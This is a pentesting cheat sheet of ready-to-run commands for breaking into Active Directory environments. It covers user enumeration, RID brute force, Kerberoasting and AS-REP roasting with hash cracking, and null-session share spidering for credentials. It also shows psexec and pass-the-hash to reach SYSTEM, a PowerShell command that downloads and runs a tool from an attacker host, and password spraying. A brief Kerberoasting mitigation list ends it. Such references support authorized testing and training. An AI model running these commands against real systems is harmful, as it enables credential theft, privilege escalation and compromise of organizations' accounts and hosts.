# AD Footholds Quick Commands
---
## 1) Get user list via SMB
```bash
# If you have valid low-privilege credentials (recommended for better results): 
sudo enum4linux-ng -U -r <Target-IP> -u <Username> -p <Password>

# -d specifies the domain 
netexec smb <Target-IP> -u '<Username>' -p '<Password>' --users 

# To perform the faster RID bruteforce (try up to 4000 users by default): 
netexec smb <Target-IP> -u '<Username>' -p '<Password>' --rid-brute

```
---
## 2) Find Kerberoastable users from a user list
**Goal:** Enumerate accounts that have SPNs (service accounts) — good kerberoast targets.
```bash
./Rubeus.exe kerberoast /outfile:hash.txt

nxc kerberos spnscan --domain <DOMAIN> --user <user> --password '<password>' --dc-ip <DC_IP> --users-file users.txt

impacket-GetUserSPNs -request -dc-ip 192.168.1.53 ignite.local/aarti:Password@1
/GetUserSPNs.py '<DOMAIN>/' -request -dc-ip <DC_IP> -usersfile users.txt -outputfile kerberoast.hashes
```
---
## 3) Find AS-REP-roastable 
**Goal:** Identify accounts with `DONT_REQUIRE_PREAUTH` set (AS-REP roast targets).
[Hacking Articles+1](https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/?utm_source=chatgpt.com)
```bash
nxc kerberos asreproast --domain <DOMAIN> --user <user> --password '<password>' --dc-ip <DC_IP> --users-file users.txt --output asrep.targets
# GetNPUsers enumerates accounts lacking pre-auth; outputs Hashcat-format lines 
python3 /path/to/impacket/examples/GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat > asrep.hashes`

hashcat -m 18200 asrep.hashes /path/to/wordlist.txt
```
---
## 4) Try SMB Null Authentication to spider through SMB shares looking for credentials

**Goal:** Use anonymous / null session to enumerate shares, users, password policy, and scan for writable shares to farm credentials.
```bash
# enumerate using an anonymous (null) session 
nxc smb <TARGET_IP> -u '' -p '' --shares  
nxc smb <TARGET_IP> -u '' -p '' --users 
nxc smb <TARGET_IP> -u '' -p '' --pass-pol`

smbmap -H <TARGET_IP> -u '' -p ''  
manspider -t smb://<TARGET_IP> -o ./loot --pattern 'password|secret|creds|.pem|.ppk|.pfx'`

```
---

## 5) Get `Local SYSTEM` Domain-connected Windows host

**Goal:** Execute a remote service (psexec)  that results in an **SYSTEM**-level process (useful to access machine account secrets or local SAM/LSA).

> Two widely used approaches: (A) remote service / psexec style (Impacket) — yields SYSTEM; (B) remote shell via `evil-winrm` then local privilege escalation (Linux/Windows local methods).

```bash
## A) Impacket `psexec.py` — remote execution as SYSTEM (if you have valid admin credentials or NTLM hash)
# With plaintext creds 
python3 /path/to/impacket/examples/psexec.py '<DOMAIN>/Administrator:Password'@<TARGET_IP>  
# With NTLM hash-only (LM:NTLM or :NTLM if no LM) 
python3 /path/to/impacket/examples/psexec.py '<DOMAIN>/Administrator@<TARGET_IP>' -hashes :<NTLM_HASH>

# get an interactive WinRM shell using a user account 
evil-winrm -i <TARGET_IP> -u <user> -p '<password>' 
# inside the shell: enumerate escalation vectors, then use a local exploit or service creation method 
# example: upload & run winPEAS to enumerate 
powershell -c "Invoke-WebRequest -Uri 'http://<attacker>/winPEAS.exe' -OutFile 'C:\\Windows\\Temp\\winPEAS.exe'; C:\\Windows\\Temp\\winPEAS.exe"
```
---

## 6) As a last resource: password spraying with the user list

**Goal:** Try a single (or a small number of) common passwords against many accounts to avoid lockouts.
```bash
### NetExec (nxc) — username list + single password or small password list
# or use multiple passwords (space-separated or file) nxc smb <TARGET_IP> -u file:users.txt -p 'Summer2025' 'Spring2025' 
# or using a file for passwords: nxc smb <TARGET_IP> -u file:users.txt -p file:passwords.txt`
nxc smb <TARGET_RANGE_OR_IP> -u file:users.txt -p 'Summer2025'  
nxc smb <TARGET_IP> -u file:users.txt -p file:passwords.txt`
```

 # Sources / references
- NetExec (nxc) docs & wiki (Kerberos, SMB, password spraying examples). [netexec.wiki+1](https://www.netexec.wiki/getting-started/using-kerberos?utm_source=chatgpt.com)
- Impacket examples (GetUserSPNs.py, GetNPUsers.py, psexec.py, secretsdump.py). [Hacking Articles+1](https://www.hackingarticles.in/kerberoasting-attack-in-active-directory/?utm_source=chatgpt.com)
- Responder common usage / Kerberos explainers. [nopsec.com+1](https://www.nopsec.com/blog/exploiting-kerberos-for-lateral-movement-and-privilege-escalation/?utm_source=chatgpt.com)
#### Mitigation

Protecting your Active Directory environment from Kerberoasting involves improving password hygiene, SPN configuration, and monitoring.

- **Use Strong, Complex Passwords:** Ensure service accounts (especially those with SPNs) use long, random, and unique passwords. Avoid reusing passwords or using dictionary words.
- **Rotate Passwords Regularly:** Implement scheduled password changes for service accounts — especially those tied to SPNs.
- **Use Managed Service Accounts (gMSA):** These accounts automatically handle complex password management and rotation, significantly reducing risk.
- **Avoid Using Highly Privileged Accounts for Services:** Don’t assign SPNs to Domain Admins or other privileged accounts. Use separate, least-privilege accounts for services.
- **Disable RC4 Encryption:** Enforce stronger encryption (AES128: 0x11, AES256: 0x12) via Group Policy:
- **Monitor Event ID 4769 Regularly:** Use SIEM tools or scripts to alert on unusual TGS requests.